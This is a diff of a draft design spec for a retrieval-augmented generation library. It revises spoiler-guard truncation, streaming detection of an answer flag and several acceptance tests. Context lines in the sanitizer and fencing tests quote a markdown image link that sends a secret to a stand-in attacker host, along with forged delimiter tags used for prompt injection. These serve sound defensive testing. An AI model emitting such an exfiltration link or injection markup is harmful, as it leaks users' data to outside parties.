@@ -2,7 +2,7 @@
 
 | | |
 | :--- | :--- |
-| **Document Version** | 1.1.9-draft |
+| **Document Version** | 1.1.10-draft |
 | **Status** | Draft, design agreed. Sibling feedback (AUD-01..26, NF-01..40, KB-01..23) was consolidated into C-01..C-39 and folded in; owner decisions Q-01..Q-08, the failure model and the pushbacks (Appendix C) are settled, and all three app agents (AudioReading, NewsIntelligence, KnowledgeBase) agreed through 1.1.8. This file is the only record of the design and its reasoning; the round's working files were removed on 2026-11-08. |
 | **Package Namespace** | `cody_ai_shared_lib.rag` (`cody-ai-shared-lib >= 0.8.0`) |
 | **Target Runtime** | Python 3.11+, synchronous core (matching the rest of `cody_ai_shared_lib`) with a bounded thread pool for independent calls |
@@ -19,7 +19,7 @@ This document is written for two readers: the coding agent that builds the engin
 
 - **Normative text** uses RFC 2119 keywords (**MUST**, **SHOULD**, **MAY**, §1.5). Build exactly this.
 - **`> Rationale:` blocks are informative.** They say why a choice was made, which alternative was rejected, and which feedback item drove it (e.g. `AUD-11`, `NF-21`, `KB-08`, or the consolidated item `C-01`). They do not add requirements. A coding agent MUST NOT remove or weaken a normative rule because it looks unnecessary without first reading its rationale; most of the non-obvious rules exist to close a specific failure.
-- **Decision log (§17)** holds the cross-cutting decisions (`D-01`..`D-23`) that affect several sections. Sections link to them instead of repeating the argument.
+- **Decision log (§17)** holds the cross-cutting decisions (`D-01`..`D-25`) that affect several sections. Sections link to them instead of repeating the argument.
 - **Phase tags:** **[contract]** frozen in delivery phase P1, because changing it later breaks every store adapter; **[v1]** delivered within phases P1–P4 (§16.2 says which phase); **[seam]** the interface ships in v1, built-in implementations come later; **[later]** after P4.
 - **[PENDING Q-xx]** marks text that depends on an open owner decision listed in §18. As of 1.1.2 none remain.
 - Requirement IDs: `RAG-<AREA>-<n>`. Acceptance tests: `AC-RAG-<nn>` (§16). Eval-readiness guarantees: `RAG-EVAL-<n>` (§14).
@@ -46,8 +46,8 @@ This document is written for two readers: the coding agent that builds the engin
 | **§13. Operations: cost, trace, resilience, security** | Usage and budget, trace and observer, failure model (agreed degradations), logging, deadlines, caching, security and resilience tables |
 | **§14. Evaluation readiness** | What v1 must guarantee so a full eval system can be added later without breaking contracts |
 | **§15. Lib-wide prerequisites** | Additive changes to `llm.py`, `jev.py`, `embedding.py`, new `pricing.py` and `rerank.py`: usage, cost and the central price table |
-| **§16. Acceptance criteria & build order** | `AC-RAG-01`..`71`, staged build plan |
-| **§17. Decision log** | `D-01`..`D-23` |
+| **§16. Acceptance criteria & build order** | `AC-RAG-01`..`73`, staged build plan |
+| **§17. Decision log** | `D-01`..`D-25` |
 | **§18. Open items** | Owner decisions and what each one changes in this spec |
 | **Appendix A. Traceability** | `C-01`..`C-39` → section |
 | **Appendix B. Revision history** | Version log |
@@ -569,7 +569,7 @@ class RAGResponse(BaseModel, Generic[MetaT]):
     sources: list[RAGCitation]            # deduplicated cited sources, in first-cited order
     retrieved: RAGRetrievalResult[MetaT]  # everything fetched, cited or not
     grounded: bool                        # §10.5
-    answer_found: bool | None             # parsed from model flag; None if absent (§10.5)
+    answer_found: Literal["yes", "no", "partial"] | None   # parsed from model flag; None if absent or invalid (§10.5)
     abstained: bool
     degraded: bool = False                # True when any agreed degradation fired (see degradations)
     citation_coverage: CitationCoverage | None = None
@@ -856,9 +856,13 @@ Apps add guards by passing objects in `request.guards`, or by registering a guar
 For document `d` with boundary `B` (exclusive: the reader has seen `[0, B)`):
 
 1. A node with `span.char_start >= B` is dropped.
-2. A node with trait `offset_addressable` and `span.char_end > B` is **truncated** to `text[: B - span.char_start]`, `span.char_end = B`, and flagged `truncated_by_guard`. This applies to every offset-addressable kind, including `passage`.
+2. A node with trait `offset_addressable` and `span.char_end >= B` is **cut at a sentence end** (D-24). This applies to every offset-addressable kind, including `passage`, and to text a store has already stopped at `B` (`local_window`, `full_doc`).
+   - Let `limit = B - span.char_start` and `prefix = text[:limit]`. The cut point is `end = analyzer.last_sentence_end(prefix)`, using the profile's `TextAnalyzer` (the engine passes it when it builds the guard).
+   - If `end` is `None`, or `limit - end > max_snap_back_chars` (default 300, guard argument), the cut point is `limit`: a hard cut at `B`. Setting the argument to `0` always cuts at `B`.
+   - The node becomes `text[:cut]` with `span.char_end = span.char_start + cut`, and is flagged `truncated_by_guard` when this shortened it.
+   - **The cut is never past `B`.** Only `prefix` is examined, so nothing after `B` can influence the result, and a passage and a local window stopping at the same `B` get the same cut point. Re-applying the guard (§5.3) changes nothing.
 3. A node **without** `offset_addressable` (summaries, entity facts, entries) is kept only if `span.char_end <= B`. It is never truncated, because a summary's text cannot be cut by offset.
-4. The section that contains `B` is therefore represented by verbatim text up to `B` (local window or truncated passages) and by the summaries of its **summary units** that end before `B` (§6.3), never by the summary of the whole section.
+4. The section that contains `B` is therefore represented by verbatim text up to the rule 2 cut point (local window or truncated passages) and by the summaries of its **summary units** that end before `B` (§6.3), never by the summary of the whole section.
 5. Citations with `span.char_end > B` after snapping are rejected (`verify_citation`).
 6. `prompt_rules()` returns the spoiler directive (§10.5), and `forces_strict_grounding = True`.
 7. **Derived text must not look ahead (RAG-ING-8).** The guard checks a node's *position*, not its *wording*. So every derived node (any node without `offset_addressable`: summaries, summary units, entity facts) MUST be generated only from source text before its own `span.char_end`. The built-in summarizer guarantees this by summarizing only its own span (§6.3). App ingestion stages that build derived nodes (for example AudioReading's character facts, built incrementally per `first_seen_offset`) carry the same obligation.
@@ -866,6 +870,7 @@ For document `d` with boundary `B` (exclusive: the reader has seen `[0, B)`):
 > **Rationale:**
 > - This fixes the 1.0.0 leak (AUD-01, AUD-11): the old rule only truncated `local_window` and `full_doc`, and admitted any summary whose section *started* before the boundary.
 > - Rule 3 is what lets Audio model character facts as nodes positioned at their first appearance, with no engine change (R-03).
+> - Rule 2 cuts at a sentence end because a sentence broken mid-word or mid-clause invites the model to complete it, and in a novel the completion is the spoiler. The limit on how far back it may go protects text with little punctuation (transcripts, OCR), where the last sentence end can be far behind and a pure snap would discard most of what the reader has seen.
 > - Forcing strict grounding is D-05: under a fallback mode, a model's pre-training knowledge of a published novel is itself a spoiler.
 
 ### 5.3 Where guards are applied
@@ -884,7 +889,7 @@ Each guard records `dropped` and `truncated` counts in the trace.
 ### 5.4 Sequential boundary in Tier 0
 Tier 0 uses `fetch_full_scope` with the boundary applied. The assembler then splits the scope into:
 - **whole sections** that end before `B` (stable prefix);
-- the **partial current section** up to `B` (volatile zone, rendered as a local window).
+- the **partial current section** up to the §5.2 rule 2 cut point (volatile zone, rendered as a local window).
 
 See §10.3 and D-07.
 
@@ -924,6 +929,7 @@ class TextAnalyzer(Protocol):
     def normalize(self, text: str) -> str: ...          # NFKC, case-fold, width-fold
     def tokenize(self, text: str) -> list[str]: ...
     def sentences(self, text: str) -> list[tuple[int, int]]: ...   # half-open offsets
+    def last_sentence_end(self, text: str) -> int | None: ...      # offset just past the last complete sentence; text may end mid-sentence (§5.2)
 ```
 - **Default `CjkAwareAnalyzer`.** Han, kana and hangul runs become overlapping character bigrams (a single-character run becomes one unigram). Latin runs become lower-cased words. Sentence boundaries follow RAG-ING-2.
 - **Optional `JiebaAnalyzer`** behind the `[rag-cjk]` extra.
@@ -958,7 +964,12 @@ class TextAnalyzer(Protocol):
 - **RAG-ING-1 (offset preservation).** For every node produced from a section with base `section.char_start`: `span.char_start = base + local_start`, `span.char_end = base + local_end`, and `section.text[local_start:local_end] == node.text`.
 - **RAG-ING-2 (sentence alignment).**
   - Target size 1,200 chars, overlap 150 (profile-configurable).
-  - Splits fall on sentence boundaries (`.` `!` `?` `。` `！` `？` `；` `\n\n`).
+  - Splits fall on sentence boundaries (`.` `!` `?` `。` `！` `？` `；` `……` `\n\n`).
+  - **Terminator rules** (per character, so English, Chinese and mixed text go through one pass with no language detection):
+    - `。` `！` `？` `；` `……` end a sentence wherever they appear; Chinese puts no space after them.
+    - `.` `!` `?` end a sentence only before whitespace, a closing quote or bracket, or the end of the text, so `3.14` and `example.com` do not split.
+    - A run of terminators (`？！`, `...`) counts as one, and closing quotes and brackets right after it (`"` `'` `”` `’` `」` `』` `）` `)` `》`) belong to the sentence.
+    - Abbreviations (`Dr.`, `U.S.`) may split early. That is accepted: a short extra sentence does no harm in the splitter, and under the guard it only cuts earlier.
   - A sentence longer than 1.5× the target MAY split at clause punctuation (`,` `;` `，` `、`), or hard-cut at 2× the target.
 - **`MarkdownStructuralSplitter`** (KB-21) works block-first:
   - It parses headings (levels 1–6), paragraphs, lists, fenced code, tables and blockquotes.
@@ -1306,6 +1317,8 @@ class RetrievalStrategy(ABC, Generic[MetaT]):
 > - KB's "the whole corpus fits, so skip retrieval" is the same idea as Audio's "the whole book fits" (KB-01).
 > - KB's request for hysteresis around the threshold stays in KB as corpus-level state (R-09).
 
+**Memory (informative, D-25).** Context assembly uses ordinary string building: no generator-based joining and no memory guard. The prompt is built once per generation attempt, and pool threads share references to the same immutable strings instead of copying them.
+
 **Index readiness depends on position (informative).** Under a sequential guard, Tier 0 is sized on the *visible* part of the document. A reader early in a long book gets Tier 0 and needs no embeddings; once the visible part passes the gate, the engine switches to a retrieval tier, which needs embeddings for everything before the position. The app must therefore have the index ready for the visible range before the position crosses the gate. `engine.plan()` (§8.12) tells it which side of the gate a request is on.
 
 ### 8.3 Keyword tiers **[v1]**
@@ -1582,16 +1595,26 @@ The assembler returns `cache_breakpoints` (after blocks 1 and 2). `ModelGateway`
 - **Forced strict.** Any guard with `forces_strict_grounding=True` (every `SequentialBoundaryGuard`) forces `"strict"` for that request. Guard prompt rules take precedence over grounding rules (D-05).
 - **Machine-readable flag.**
   - The model is instructed to begin its answer with `[[answer_found=yes|no|partial]]`.
-  - The engine parses the flag into `answer_found`, strips it from `answer_final`, and in streaming holds back the first ≤ 32 characters until it is resolved.
+  - The engine parses the flag into `answer_found` and strips it from `answer_final`. Streaming holds back only as much as it needs to decide whether a flag is there (below).
   - A missing or invalid flag gives `answer_found=None`, never a guess.
-  - `abstained = answer_found == "no"` in strict mode.
+  - `abstained = answer_found == "no"` in strict mode, and `False` otherwise. `"partial"` is not an abstention.
+  - Callers that only need a yes-or-no decision use `abstained`. `answer_found` is a string, so `if response.answer_found:` is true for `"no"`; compare it with a value instead.
+- **Flag detection while streaming.** The engine checks the start of the output character by character and releases text at the first moment it cannot be a flag. It never waits for 32 characters, or for a newline, once the text has ruled a flag out.
+  1. **Leading whitespace** (including newlines) is discarded, as is whitespace right after a flag, in `answer_final` too. Models often emit a newline first, so it does not end detection.
+  2. **Prefix.** Text is compared, case-insensitively, with `[[answer_found=`. At the first character that does not match, everything held is released as a `delta` and `answer_found=None`. `Based on…` is released at `B`; a Markdown link `[Source](…)` is released at `S`.
+  3. **Value.** After the full prefix, text is held until `]]`. `yes`, `no` or `partial` is the flag's value. Any other value is an invalid flag: it is removed and never shown, `answer_found=None`, and a WARNING is logged.
+  4. **Cap.** If 32 characters, counted from the first non-whitespace character, are held without a closing `]]`, they are released as text and `answer_found=None`. The longest valid flag, `[[answer_found=partial]]`, is 24 characters.
+  5. **End of stream** while text is held: it is released as a last `delta`, and `answer_found=None`. On an error or a cancelled stream, held text is not emitted.
+  - `stream_mode="buffered"` and non-streaming generation apply the same rules to the whole text. A flag anywhere other than the start is not parsed.
 - **Spoiler directive** (from `SequentialBoundaryGuard.prompt_rules()`):
   > *"SPOILER GUARD ACTIVE: the reader has reached position {B} and you have only been given text before it. Do not reveal, infer or hint at later events, fates or conclusions, even from prior knowledge of this work. If asked what happens later, say that answering would spoil sections beyond their current position."*
-- **RAG-RES-4 (empty retrieval).** When no nodes survive, the engine still generates (or, with `route=no_retrieval`, answers conversationally) under the grounding rules. It returns `answer_found=False` with no citations and never invents sources.
+- **RAG-RES-4 (empty retrieval).** When no nodes survive, the engine still generates (or, with `route=no_retrieval`, answers conversationally) under the grounding rules. It returns `answer_found="no"` with no citations and never invents sources.
 
 > **Rationale:**
 > - News answers from general knowledge with a label; KB and Audio must not. A flag is better than prompt-only behaviour because a UI can show a "couldn't find it" state (NF-07, KB-10).
 > - An unlabelled "open" mode was rejected (R-11a).
+> - `answer_found` keeps the model's three values because a boolean would have to report a partly answered question as either complete or not found. The UI and later evals can treat it separately, while `abstained` stays a plain boolean for simple callers.
+> - Detection stops at the first impossible character because a model answer either starts with the flag or nearly always rules it out within a character or two, so the first token is not delayed. The 32-character limit only matters for output that imitates the flag and never closes it.
 
 ### 10.6 Generation strategies **[seam + `stuff` v1]**
 ```python
@@ -1997,7 +2020,7 @@ class RAGTrace(BaseModel):
 | **DG-14** | Summarizer fails at ingestion (after DG-01, DG-02) | Continue without a summary, `summary_status="failed"` | **opt-in** | ERROR | Raise `RAGStageError("summarizer")` (also the default without opt-in) |
 
 - `profile.fallbacks` turns opt-in rows on (`{"query_embedding": "keyword", "summarizer": "skip"}`) and can turn any default-on row off (`{"rerank": "raise"}`). Keys are `rerank`, `jev`, `intent`, `generation`, `summarizer`, `query_embedding`, `ingest_embedding`, `cache`, `observer`, and `deadline` (DG-10); unknown keys fail `validate()`.
-- **Not failures, so not in the table:** empty retrieval (a normal `answer_found=False` result, RAG-RES-4), citations that fail verification (removed or flagged per §11.2), fence-id rotation on collision (§10.4), and an opt-in relaxation step (§7.6, reported in `relaxations`).
+- **Not failures, so not in the table:** empty retrieval (a normal `answer_found="no"` result, RAG-RES-4), citations that fail verification (removed or flagged per §11.2), fence-id rotation on collision (§10.4), and an opt-in relaxation step (§7.6, reported in `relaxations`).
 - **Never degradable** (always raise, whatever `fallbacks` says): store errors (`RetrievalError`, wrapping the cause), missing required scope, unsupported filters, guard errors, embedding-space mismatch, configuration errors, blocked output, and a stream that breaks after it started.
 
 **Startup validation.** The `RAGEngine` constructor runs `validate()` and raises `ProfileConfigError` listing every problem, so nothing knowable in advance becomes a per-request fallback:
@@ -2072,7 +2095,7 @@ class Cache(Protocol):
 | **RAG-RES-1** | A Jev error continues on the LLM-rewrite path (DG-03); a missing key with Jev enabled fails at startup (§7.4). |
 | **RAG-RES-2** | A reranker failure keeps the incoming order (DG-06) and is reported to the caller (§9.3, §10.10). |
 | **RAG-RES-3** | A zero query vector is never searched. Raise `EmbeddingProviderError`, unless the app opted in to keyword search (DG-07, §8.4). |
-| **RAG-RES-4** | Empty retrieval returns a grounded "not found" answer with `answer_found=False` and no fabricated sources (§10.5). |
+| **RAG-RES-4** | Empty retrieval returns a grounded "not found" answer with `answer_found="no"` and no fabricated sources (§10.5). |
 | **RAG-RES-5** | Streaming follows the event contract of §10.8 in both native and buffered mode, and is cancel-safe. |
 | **RAG-RES-6** | Generation retries, then falls back along the model list (DG-01, DG-02). If every model fails, raise `GenerationError` carrying the retrieval result (§10.7). |
 | **RAG-RES-7** | Deadlines skip optional stages before the request would exceed its budget (DG-10); a required stage past the deadline raises (§13.4). |
@@ -2251,7 +2274,7 @@ These changes are made across `cody_ai_shared_lib`, not inside the RAG package. 
 | **AC-RAG-21** | Keyword tiers | §8.3 | `keyword_first` returns keyword hits when there are ≥ `min_hits`, and otherwise falls back with a recorded reason. `keyword_only` makes zero embedding calls. |
 | **AC-RAG-22** | Tier 3 | §8.6, §5.2 | Overview retrieval combines summaries, the local window (profile radius) and passages. The summary of the section containing the boundary is absent. |
 | **AC-RAG-23** | Guards | §5.2, §5.3 | **Canary.** A unique token placed just after the boundary appears nowhere in the prompt, deltas, answer, citations or trace, for **every** registered strategy, including a deliberately leaky test strategy. |
-| **AC-RAG-24** | Guards | §5.2 | A passage straddling `B` is truncated to `B` and flagged. A summary with `char_end > B` is dropped. An entity-fact node at `first_seen > B` is dropped. |
+| **AC-RAG-24** | Guards | §5.2 | A passage straddling `B` is cut at or before `B` (AC-RAG-73) and flagged. A summary with `char_end > B` is dropped. An entity-fact node at `first_seen > B` is dropped. |
 | **AC-RAG-25** | Guards | §3.6 | `max_char_offset_by_doc` applies a separate boundary per document. |
 | **AC-RAG-26** | Scope | §5.6 | A missing required key raises `MissingRequiredScopeError`, and the store records zero calls. |
 | **AC-RAG-27** | Filters | §3.6 | An unknown `custom` key or a wrong value type raises `UnsupportedFilterError` before any store call. |
@@ -2266,8 +2289,8 @@ These changes are made across `cody_ai_shared_lib`, not inside the RAG package. 
 | **AC-RAG-36** | Hydration | §9.6 | Light nodes are hydrated exactly once, only for nodes that survive budgeting. |
 | **AC-RAG-37** | Fencing | RAG-SEC-1 | A forged `</data-ID>`, a zero-width-split `</ data>`, and the real fence id embedded in content are all neutralized. The id is on both tags. `AT&T` and `a < b` are not escaped. A collision rotates the id. |
 | **AC-RAG-38** | Layout | §10.3, D-07 | Over two turns with `B` moving inside the same section, the system and stable-data blocks are byte-identical. Crossing a section boundary changes them. |
-| **AC-RAG-39** | Grounding | §10.5, D-05 | `labelled_fallback` is overridden to strict while a sequential guard is active. `[[answer_found=no]]` is parsed and stripped. A missing flag yields `None`. |
-| **AC-RAG-40** | Empty | RAG-RES-4 | Position 0 with the spoiler guard, or an empty date window, returns `answer_found=False`, no citations and no fabricated sources. |
+| **AC-RAG-39** | Grounding | §10.5, D-05 | `labelled_fallback` is overridden to strict while a sequential guard is active. `[[answer_found=no]]` is parsed and stripped, and sets `abstained=True` in strict mode. `[[answer_found=partial]]` gives `"partial"` with `abstained=False`. A missing flag yields `None`. |
+| **AC-RAG-40** | Empty | RAG-RES-4 | Position 0 with the spoiler guard, or an empty date window, returns `answer_found="no"`, no citations and no fabricated sources. |
 | **AC-RAG-41** | Citations | §11.2 | `[2]` resolves through `turn_map`. A marker not in the fence is unverified and removed from `answer_final`. Offset citations snap to the node span. A revision change sets `stale=True`. |
 | **AC-RAG-42** | Answer checks | §11.3–11.5 | Quote ratio ≥ 0.85 verifies. Coverage counts cited sentences. `on_violation="repair"` regenerates exactly once inside the budget guard. |
 | **AC-RAG-43** | Sanitizer | RAG-SEC-6 | `![x](https://evil.example/?q=secret)` is neutralized. A link to a retrieved source's host survives. The fence id never appears in `answer_final`. |
@@ -2299,6 +2322,8 @@ These changes are made across `cody_ai_shared_lib`, not inside the RAG package. 
 | **AC-RAG-69** | Pricing modules | §15 | A listed model's `LLMUsage.cost_usd` equals tokens times the table price, with `price_table_version`; the same holds for `JevClient`, `generate_embedding_with_usage` (`estimated=True`) and `rerank.py`; an unlisted model gives `None`; an override takes precedence; `usage_total.cost_usd` equals the sum of the module-reported costs. |
 | **AC-RAG-70** | Usage on failure | RAG-OPS-1, RAG-OPS-2 | For each of a truncated generation, a blocked generation, all models failing, a section failing mid-ingestion, and a stream closed after two deltas, the app receives a usage total (on the exception, the `error` event, or `RAGStream.usage_total`) equal to the calls actually made. A timeout attempt appears with `billing="unknown"`. A guard reading `ctx.request_spent` stops a request at its third paid call. An `LLMClient` structured-output parse failure raises with the call's usage attached. |
 | **AC-RAG-71** | Prepared nodes | RAG-ING-13, §4.6 #15 | A row inserted by the app from `prepare_nodes` is skipped by `sync_document` and `reconcile` (no re-embedding); changing the node's text makes it stale; the fingerprints equal those `upsert_section_nodes` would write. A failed embedding returns `vector=[]`, never a zero vector. |
+| **AC-RAG-72** | Flag streaming | §10.5 | `Based on…` is released at its first character with `answer_found=None`; `[Source](u)` at its second. `\n[[answer_found=partial]]\nText` emits only `Text` and sets the flag, under any chunking down to one character per chunk. `[[answer_found=maybe]]` is removed, logged at WARNING and gives `None`. A flag-like text that never closes is released at 32 characters; one still held at end of stream is released as a last delta. |
+| **AC-RAG-73** | Sentence cut | §5.2 rule 2, RAG-ING-2 | With `B` mid-sentence in English, Chinese and mixed text, the node ends at the last complete sentence before `B`, including closing quotes (`他说：“走吧。”`); `3.14` is not treated as a sentence end. `span.char_end` matches the shortened text and never exceeds `B`. A passage and a local window at the same `B` get the same cut. With no sentence end before `B`, or one more than `max_snap_back_chars` back, the cut is exactly `B`. A second guard pass changes nothing. The canary test (AC-RAG-23) passes with this cut. |
 
 ### 16.2 Delivery phases (Q-04)
 Delivery follows production need: first what both production apps share, then AudioReading (which has no RAG today), then the NewsIntelligence migration, then KnowledgeBase (still in development, so the easiest to adapt) and everything else. Each step ends with every existing `cody-ai-shared-lib` test and every new `tests/rag/` test passing.
@@ -2316,7 +2341,7 @@ Delivery follows production need: first what both production apps share, then Au
 - Build: sentence splitter, summarizer, `BatchEmbedder`, resumable and append-only `ingest_document`, fingerprints and `sync_document`, `prepare_nodes`; Tier 0 with the token gate; `engine.plan()`; summary units; analyzer tokens with `build_tsquery` and the CJK measurement with AudioReading (§12.3); atomic section writes and budget-aware ingestion; bounded conversation state; Tier 3 with local window; sequential boundary end-to-end (canary); conversation state and follow-up reuse; native `stream_query`; cache-friendly layout and embedding cache; `offset` formatter snapping; SSE helper.
 - Reference SQL templates in `specs/sql/` (§4.7), written alongside Audio's migrations.
 - Audio builds its adapter and runs the contract kit in its CI.
-- Tests: AC-RAG-01, 04–08, 10, 22–24, 29, 30, 38, 45, 48, 54, 58, 59, 64–67, 71.
+- Tests: AC-RAG-01, 04–08, 10, 22–24, 29, 30, 38, 45, 48, 54, 58, 59, 64–67, 71–73.
 
 **P3 · NewsIntelligence migration (chat first, then feed search)**
 - Build: native hybrid raw-score handling, `"card"`/`"context"` hydration projections, temporal resolver with `date_field` and `applied_filters`, relaxation ladder, `SecondaryQueryFanOut`, recency booster, score fusion, `PassThroughSplitter` and standalone embedder, `retrieve()` sizing for the feed (§8.10), named profile variants (`news_chat`, `news_search`).
@@ -2428,6 +2453,16 @@ Each entry: the decision, the alternative rejected, and why. Sections refer here
   - *Rejected:* (a) prices injected per RAG profile (1.1.0–1.1.5), which left direct calls without cost and required a price list in every app; (b) a lib-wide `UsageSink` callback (Audio N-9 item 6), which would report RAG's internal calls twice.
   - *Why:* one place to update prices for every project; stateless modules; budget policy where the totals live. Usage on the failure path closes the gap AudioReading found (closing reply N-10): providers bill what they processed even when the request later fails, and the most expensive failures (a full-context prompt that comes back truncated or blocked) would otherwise never reach a daily budget.
 
+- **D-24 · The sequential guard cuts at a sentence end, not at the exact offset** (owner decision, 2026-11-08).
+  - *Decision:* a node reaching `B` is cut at the last complete sentence in the text before `B`, for English and Chinese alike, going back at most `max_snap_back_chars` (default 300); otherwise it is cut at `B` (§5.2 rule 2).
+  - *Rejected:* (a) always cutting exactly at `B` (1.0.0–1.1.9), which hands the model broken words and clauses; (b) a snap with no limit, which loses most of a node in poorly punctuated text.
+  - *Why:* the safety property is unchanged, since the cut can only move earlier and looks only at text before `B`. The cost is at most one partial sentence the reader has already passed, normally the one in progress.
+
+- **D-25 · Standard string assembly for Tier 0, no memory guard** (owner decision, 2026-11-08).
+  - *Decision:* context assembly builds ordinary strings. No generator-based joining and no explicit memory guard in v1.
+  - *Rejected:* generator-based joining, which saves nothing because `"".join()` materializes its input first and provider SDKs need the whole body anyway; a memory guard, which would add a failure path for a cost too small to matter.
+  - *Why:* measured with 405,000 Chinese characters (the top of the Tier 0 range), the text is 0.8 MB as a Python string, 1.2 MB as UTF-8 and 2.4 MB as escaped JSON, so a few copies stay around 10 MB per request. The owner also plans to move the hosts to 2 GB, and heavy concurrent use is not expected in this phase. *Revisit* if many Tier 0 requests have to run at once on a small host; the limit then belongs to the app's request concurrency.
+
 ---
 
 ## 18. Open Items
@@ -2506,6 +2541,7 @@ Each entry: the decision, the alternative rejected, and why. Sections refer here
 | **1.1.7-draft** | 2026-11-08 | cody-ai-shared-lib agent | **Usage on the failure path** (AudioReading closing reply N-10, agreed by the owner). Engine errors and the stream `error` event carry the usage of calls already made (RAG-OPS-1); `CallContext.request_spent` gives the guard the spend so far in the request; D-23 amended. Three related gaps closed in the same change: model-module exceptions after a billed response carry that call's usage (direct callers too); a cancelled stream reports estimated spend through `RAGStream.usage_total` (RAG-OPS-2); failed attempts with unknown billing are recorded with `billing="unknown"`. AC-RAG-70. |
 | **1.1.8-draft** | 2026-11-08 | cody-ai-shared-lib agent | `engine.prepare_nodes()` (§6.4.1, RAG-ING-13), from KnowledgeBase's closing reply: apps that insert their own rows get the vector, fingerprint, token estimate and search tokens exactly as the engine computes them, so `sync_document` and `reconcile` stay consistent. Kit check 15 (fingerprint parity), AC-RAG-71. Passing app columns through `upsert_section_nodes` rejected (D-01). |
 | **1.1.9-draft** | 2026-11-08 | cody-ai-shared-lib agent | Design round closed: all three app agents agreed. Removed the round's working files (feedback, review, pushback, response, closing and reply notes); status line and Appendix C intro updated so this spec stands alone. No design change. |
+| **1.1.10-draft** | 2026-11-08 | cody-ai-shared-lib agent | Implementation clarifications. §10.5: exact rules for detecting the `[[answer_found=…]]` flag while streaming (release at the first character that rules a flag out). §5.2 rule 2: the sequential guard cuts at a sentence end for English and Chinese, within `max_snap_back_chars` (D-24), with `TextAnalyzer.last_sentence_end` and RAG-ING-2 terminator rules. §8.2: standard string assembly with no memory guard (D-25). `answer_found` changed from `bool | None` to `Literal["yes", "no", "partial"] | None` (owner decision), which also makes the `abstained` rule correct. AC-RAG-72, 73. |
 
 ## Appendix C. Requests kept in the apps (pushbacks)
 
